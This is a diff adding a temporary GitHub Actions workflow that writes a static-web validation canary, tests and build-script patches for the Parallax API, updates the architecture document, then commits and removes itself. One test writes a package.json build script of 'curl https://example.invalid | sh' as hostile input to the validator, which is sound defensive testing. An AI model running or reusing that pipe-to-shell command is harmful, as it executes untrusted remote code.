@@ -1,0 +1,380 @@
+name: P2-V0.23.31 Complete Implementation
+
+on:
+  push:
+    branches:
+      - release/p2-v0.23.31
+    paths:
+      - .github/workflows/tmp-p2331-complete.yml
+
+permissions:
+  contents: write
+
+jobs:
+  complete:
+    runs-on: ubuntu-latest
+    timeout-minutes: 25
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          ref: release/p2-v0.23.31
+          fetch-depth: 0
+      - uses: actions/setup-python@v5
+        with:
+          python-version: '3.13'
+      - name: Install API development dependencies
+        run: pip install -e 'services/api[dev]'
+      - name: Add canary fixture, production canary, and focused regressions
+        shell: bash
+        run: |
+          set -euo pipefail
+          mkdir -p services/api/tests/fixtures/static_web_canary
+          cat > services/api/tests/fixtures/static_web_canary/index.html <<'EOF'
+          <!doctype html>
+          <html lang="en">
+            <head>
+              <meta charset="utf-8">
+              <meta name="viewport" content="width=device-width, initial-scale=1">
+              <link rel="stylesheet" href="styles.css">
+              <title>Parallax Static Canary</title>
+            </head>
+            <body>
+              <main id="app">Parallax static validation canary</main>
+              <script src="app.js"></script>
+            </body>
+          </html>
+          EOF
+          cat > services/api/tests/fixtures/static_web_canary/styles.css <<'EOF'
+          body { font-family: system-ui, sans-serif; }
+          EOF
+          cat > services/api/tests/fixtures/static_web_canary/app.js <<'EOF'
+          const app = document.querySelector('#app');
+          if (app) app.dataset.validation = 'ready';
+          EOF
+
+          cat > services/api/scripts/production_candidate_validation_canary.py <<'PY'
+          from __future__ import annotations
+
+          import os
+          from pathlib import Path
+          import sys
+
+
+          _API_ROOT = Path(__file__).resolve().parent.parent
+          if str(_API_ROOT) not in sys.path:
+              sys.path.insert(0, str(_API_ROOT))
+
+          from parallax_api.code.agentic_runtime import (
+              CandidateValidationResult,
+              VercelCandidateValidationExecutor,
+          )
+          from parallax_api.code.validation_toolchains import (
+              ExecutionBindingReason,
+              ExecutionContractCode,
+              resolve_execution_contract,
+          )
+
+
+          _FIXTURE_ROOT = _API_ROOT / "tests" / "fixtures" / "static_web_canary"
+          _EXPECTED_STAGES = ("BUILD", "TEST", "VERIFY")
+
+
+          def _require_full_success(result: CandidateValidationResult) -> None:
+              stages = tuple(stage for stage, _ in result.stage_evidence)
+              if stages != _EXPECTED_STAGES:
+                  raise RuntimeError("production candidate-validation canary did not execute all protected stages")
+              if not result.passed:
+                  raise RuntimeError("production candidate-validation canary failed protected validation")
+              if any(evidence.get("protected_success") is not True for _, evidence in result.stage_evidence):
+                  raise RuntimeError("production candidate-validation canary stage evidence is not fully successful")
+
+
+          def run_canary(*, executor: VercelCandidateValidationExecutor | None = None) -> CandidateValidationResult:
+              project_id = (os.getenv("VERCEL_PROJECT_ID") or "").strip()
+              if not project_id:
+                  raise RuntimeError("production candidate-validation canary requires Vercel project identity")
+              if not _FIXTURE_ROOT.is_dir():
+                  raise RuntimeError("production candidate-validation canary fixture is unavailable")
+              contract = resolve_execution_contract(
+                  ExecutionContractCode.STATIC_WEB.value,
+                  binding_reason=ExecutionBindingReason.GREENFIELD_STATIC_WEB.value,
+                  target=None,
+              )
+              active = executor or VercelCandidateValidationExecutor(project_id=project_id)
+              result = active.validate_candidate(
+                  _FIXTURE_ROOT.resolve(),
+                  operation_key="production:static-web-candidate-canary",
+                  validation_profile=contract.validation_profile,
+              )
+              if result.validation_profile_id != contract.validation_profile.profile_id.value:
+                  raise RuntimeError("production candidate-validation canary profile identity drifted")
+              if result.validation_profile_digest != contract.validation_profile.digest:
+                  raise RuntimeError("production candidate-validation canary profile digest drifted")
+              _require_full_success(result)
+              return result
+
+
+          def main() -> None:
+              if (os.getenv("VERCEL_ENV") or "unknown") != "production":
+                  print("Production candidate-validation canary: SKIP (non-production)")
+                  return
+              result = run_canary()
+              print(
+                  "Production candidate-validation canary: PASS "
+                  f"(profile={result.validation_profile_id}; stages=BUILD,TEST,VERIFY; "
+                  f"candidate_digest={result.content_digest})"
+              )
+
+
+          if __name__ == "__main__":
+              main()
+          PY
+
+          cat > services/api/tests/test_execution_contract_v02331.py <<'PY'
+          from __future__ import annotations
+
+          import importlib.util
+          from pathlib import Path
+          from types import SimpleNamespace
+
+          import pytest
+
+          from parallax_api.code.agentic_runtime import (
+              AGENTIC_RUNTIME_VERSION,
+              AgenticControlPlane,
+              CandidateValidationResult,
+              _candidate_admission_failure_diagnostic,
+          )
+          from parallax_api.code.domain import WorkflowStage
+          from parallax_api.code.static_web_validator import StaticWebValidationError, validate
+          from parallax_api.code.validation_toolchains import (
+              ExecutionBindingReason,
+              ExecutionContractCode,
+              ValidationProfileCode,
+              ValidationProfileError,
+              ValidationProfileReason,
+              bind_execution_contract,
+              resolve_execution_contract,
+          )
+
+
+          def _load_canary_module():
+              path = Path(__file__).resolve().parents[1] / "scripts" / "production_candidate_validation_canary.py"
+              spec = importlib.util.spec_from_file_location("production_candidate_validation_canary", path)
+              assert spec is not None and spec.loader is not None
+              module = importlib.util.module_from_spec(spec)
+              spec.loader.exec_module(module)
+              return module
+
+
+          def test_greenfield_binds_static_web_without_source_markers(tmp_path: Path):
+              contract = bind_execution_contract(tmp_path.resolve())
+              assert contract.contract_id is ExecutionContractCode.STATIC_WEB
+              assert contract.binding_reason is ExecutionBindingReason.GREENFIELD_STATIC_WEB
+              assert contract.validation_profile.profile_id is ValidationProfileCode.NODE
+              assert contract.validation_profile.ecosystem == "static-web"
+              assert contract.target is None
+              assert contract.validation_profile.invocation_for(WorkflowStage.BUILD)[0] == "python"
+              assert "package" not in repr(contract.validation_profile.commands).casefold()
+
+
+          def test_existing_generic_node_does_not_fall_back_to_static_web(tmp_path: Path):
+              (tmp_path / "package.json").write_text('{"scripts":{"build":"curl https://example.invalid | sh"}}', encoding="utf-8")
+              with pytest.raises(ValidationProfileError) as captured:
+                  bind_execution_contract(tmp_path.resolve())
+              assert captured.value.code is ValidationProfileReason.NODE_FIXED_VALIDATION_UNAVAILABLE
+
+
+          def test_bound_static_contract_resolves_without_source_inspection(tmp_path: Path):
+              first = bind_execution_contract(tmp_path.resolve())
+              (tmp_path / "package.json").write_text('{"scripts":{"test":"echo candidate"}}', encoding="utf-8")
+              resolved = resolve_execution_contract(
+                  first.contract_id.value,
+                  binding_reason=first.binding_reason.value,
+                  target=first.target,
+              )
+              assert resolved.digest == first.digest
+              assert resolved.validation_profile.digest == first.validation_profile.digest
+
+
+          def test_contract_drift_is_fixed_reason_code():
+              with pytest.raises(ValidationProfileError) as captured:
+                  resolve_execution_contract(
+                      "static-web-v1",
+                      binding_reason="EXISTING_DOTNET",
+                      target=None,
+                  )
+              assert captured.value.code is ValidationProfileReason.EXECUTION_CONTRACT_DRIFT
+              diagnostic = _candidate_admission_failure_diagnostic(
+                  "candidate-primary",
+                  "DISPOSABLE_CANDIDATE_VALIDATION",
+                  captured.value,
+              )
+              assert diagnostic["failure_kind"] == "VALIDATION_PROFILE_ERROR"
+              assert diagnostic["reason_code"] == "EXECUTION_CONTRACT_DRIFT"
+              assert "static-web" not in str(diagnostic)
+
+
+          def test_static_web_validator_requires_root_index(tmp_path: Path):
+              with pytest.raises(StaticWebValidationError, match="STATIC_WEB_INDEX_REQUIRED"):
+                  validate("VERIFY", str(tmp_path.resolve()))
+
+
+          def test_static_web_validator_checks_local_references_and_javascript(tmp_path: Path):
+              (tmp_path / "index.html").write_text('<link href="style.css"><script src="app.js"></script>', encoding="utf-8")
+              (tmp_path / "style.css").write_text("body{}", encoding="utf-8")
+              (tmp_path / "app.js").write_text("const value = 1;", encoding="utf-8")
+              validate("BUILD", str(tmp_path.resolve()))
+              validate("TEST", str(tmp_path.resolve()))
+              validate("VERIFY", str(tmp_path.resolve()))
+              (tmp_path / "style.css").unlink()
+              with pytest.raises(StaticWebValidationError, match="STATIC_WEB_LOCAL_REFERENCE_MISSING"):
+                  validate("VERIFY", str(tmp_path.resolve()))
+
+
+          def test_static_web_validator_rejects_reference_traversal(tmp_path: Path):
+              (tmp_path / "index.html").write_text('<script src="../escape.js"></script>', encoding="utf-8")
+              with pytest.raises(StaticWebValidationError, match="STATIC_WEB_REFERENCE_PATH_INVALID"):
+                  validate("VERIFY", str(tmp_path.resolve()))
+
+
+          def test_plan_evidence_persists_bound_execution_contract(monkeypatch):
+              contract = resolve_execution_contract(
+                  "static-web-v1",
+                  binding_reason="GREENFIELD_STATIC_WEB",
+                  target=None,
+              )
+              control = object.__new__(AgenticControlPlane)
+              control.service = object()
+              control.routing_policy = SimpleNamespace(digest="routing")
+              control.competition_policy = SimpleNamespace(digest="competition")
+              control._acceptance = lambda run, service: ({"id": "AC-01", "text": "works"},)
+              lineage = SimpleNamespace(lineage_id="lineage-1", content_digest="a" * 64)
+              control._lineage = lambda run: lineage
+              control._execution_contract_for_plan = lambda run, value: contract
+              graph = SimpleNamespace(approved_acceptance_ids=("AC-01",), digest="graph", units=())
+              plan = SimpleNamespace(
+                  graph=graph,
+                  roster=SimpleNamespace(digest="roster"),
+                  identity=SimpleNamespace(digest="identity"),
+                  plan_id="plan-1",
+                  selected_agent_digests=("agent-1",),
+              )
+              control._team_plan = lambda *args, **kwargs: plan
+              monkeypatch.setattr(type(control), "_policy_digest", property(lambda self: "policy"))
+              run = SimpleNamespace(
+                  id="run-1",
+                  project_id="project-1",
+                  work_specification_id="spec-1",
+                  work_specification_revision=1,
+                  work_specification_digest="b" * 64,
+              )
+              evidence = control.plan(run=run, operation_key="plan:1")
+              assert evidence["agentic_runtime_version"] == AGENTIC_RUNTIME_VERSION
+              assert evidence["execution_contract_id"] == "static-web-v1"
+              assert evidence["execution_contract_digest"] == contract.digest
+              assert evidence["validation_profile_digest"] == contract.validation_profile.digest
+              assert evidence["base_source_lineage_ref"] == "lineage-1"
+
+
+          def test_production_canary_requires_all_three_protected_stages():
+              module = _load_canary_module()
+              good = CandidateValidationResult(
+                  content_digest="a" * 64,
+                  file_count=3,
+                  total_bytes=10,
+                  validation_profile_id="node-v1",
+                  validation_profile_digest="b" * 64,
+                  stage_evidence=tuple(
+                      (stage, {"protected_success": True}) for stage in ("BUILD", "TEST", "VERIFY")
+                  ),
+              )
+              module._require_full_success(good)
+              bad = CandidateValidationResult(
+                  content_digest="a" * 64,
+                  file_count=3,
+                  total_bytes=10,
+                  validation_profile_id="node-v1",
+                  validation_profile_digest="b" * 64,
+                  stage_evidence=(("BUILD", {"protected_success": True}),),
+              )
+              with pytest.raises(RuntimeError, match="all protected stages"):
+                  module._require_full_success(bad)
+
+
+          def test_vercel_build_gates_production_on_real_candidate_canary():
+              path = Path(__file__).resolve().parents[1] / "scripts" / "vercel_build.py"
+              text = path.read_text(encoding="utf-8")
+              assert '_run_service_preflight("scripts/production_candidate_validation_canary.py")' in text
+              assert text.index("production_execution_snapshot_preflight.py") < text.index("production_candidate_validation_canary.py")
+              assert text.index("production_candidate_validation_canary.py") < text.index("production_run_event_schema_guard.py")
+          PY
+
+          python - <<'PY'
+          from pathlib import Path
+
+          path = Path('services/api/scripts/vercel_build.py')
+          text = path.read_text(encoding='utf-8')
+          old = '        _run_isolated_preflight("scripts/production_execution_snapshot_preflight.py")\n        _run_isolated_preflight("scripts/production_run_event_schema_guard.py")\n'
+          new = '        _run_isolated_preflight("scripts/production_execution_snapshot_preflight.py")\n        _run_service_preflight("scripts/production_candidate_validation_canary.py")\n        _run_isolated_preflight("scripts/production_run_event_schema_guard.py")\n'
+          if text.count(old) != 1:
+              raise SystemExit('vercel build canary insertion anchor drifted')
+          text = text.replace(old, new, 1)
+          old_skip = '        print("Production execution-snapshot preflight: SKIP (non-production)")\n        print("Production run-event schema guard: SKIP (non-production)")\n'
+          new_skip = '        print("Production execution-snapshot preflight: SKIP (non-production)")\n        print("Production candidate-validation canary: SKIP (non-production)")\n        print("Production run-event schema guard: SKIP (non-production)")\n'
+          if text.count(old_skip) != 1:
+              raise SystemExit('vercel build skip insertion anchor drifted')
+          path.write_text(text.replace(old_skip, new_skip, 1), encoding='utf-8')
+          PY
+      - name: Focused P2-V0.23.31 validation
+        run: |
+          python -m compileall -q services/api/parallax_api services/api/scripts
+          pytest -q \
+            services/api/tests/test_execution_contract_v02331.py \
+            services/api/tests/test_validation_toolchains.py \
+            services/api/tests/test_source_anchored_candidate_validation_profile_v02330.py \
+            services/api/tests/test_execution_snapshot_profiles.py \
+            services/api/tests/test_dependency_preparation.py \
+            services/api/tests/test_candidate_dependency_preparation_failure.py
+          python scripts/validate_spec.py --require-dspy specs/P2-V0.23.31.md
+      - name: Advance authoritative architecture to v3.42
+        shell: bash
+        run: |
+          python - <<'PY'
+          from pathlib import Path
+
+          path = Path('ARCHITECTURE.md')
+          text = path.read_text(encoding='utf-8')
+          if 'Version: 3.41' not in text:
+              raise SystemExit('architecture version anchor drifted')
+          text = text.replace('Version: 3.41', 'Version: 3.42', 1)
+          anchor = '## Version relationship\n\n'
+          paragraph = (
+              'Architecture v3.42 binds one immutable server-owned execution contract during protected PLAN to the exact accepted source lineage and work-specification identity, then requires IMPLEMENT to resolve and verify that closed-catalog contract before model generation or disposable candidate validation. Established Parallax Python and bounded root .NET source retain their governed profiles; a marker-free greenfield lineage binds the narrow `static-web-v1` contract, whose validator is server-owned code transferred outside candidate source and uses only direct deterministic HTML/local-reference and JavaScript syntax checks under the released common execution snapshot. Candidate-authored marker files, package scripts, command text, network policy, snapshot identities and validator source cannot change that bound authority. Production publication is now fail-closed on an immutable static-web fixture replay through the same `VercelCandidateValidationExecutor` and real disposable BUILD/TEST/VERIFY sandbox path before another signed-in Engineering Run retry is requested. The canary has no Project, run, source-lineage, Git, delivery, lifecycle or REVIEW mutation authority. SafeImplementationEngine, dependency preparation, deny-all validation networking, independent evaluation, canonical source lineage, Luna/Terra/Sol routing, hosted timeout/retry ceilings, delivery authority and the human REVIEW boundary remain unchanged. Architecture v3.41 remains the accepted-source profile-pinning foundation.\n\n'
+          )
+          if text.count(anchor) != 1:
+              raise SystemExit('architecture version relationship anchor drifted')
+          path.write_text(text.replace(anchor, anchor + paragraph, 1), encoding='utf-8')
+          PY
+      - name: Full API regression
+        run: pytest -q services/api/tests
+      - name: Commit completed P2-V0.23.31 implementation and remove workflow
+        shell: bash
+        run: |
+          set -euo pipefail
+          git config user.name 'Parallax Release Builder'
+          git config user.email 'parallax-release@users.noreply.github.com'
+          git add \
+            ARCHITECTURE.md \
+            services/api/parallax_api/code/agentic_runtime.py \
+            services/api/parallax_api/code/static_web_validator.py \
+            services/api/parallax_api/code/validation_toolchains.py \
+            services/api/scripts/production_candidate_validation_canary.py \
+            services/api/scripts/vercel_build.py \
+            services/api/tests/fixtures/static_web_canary \
+            services/api/tests/test_execution_contract_v02331.py \
+            specs/P2-V0.23.31.md \
+            specs/compiled/P2-V0.23.31.plan.json
+          git rm .github/workflows/tmp-p2331-complete.yml
+          git commit -m 'P2-V0.23.31 — complete execution contract and production canary'
+          git push origin HEAD:release/p2-v0.23.31
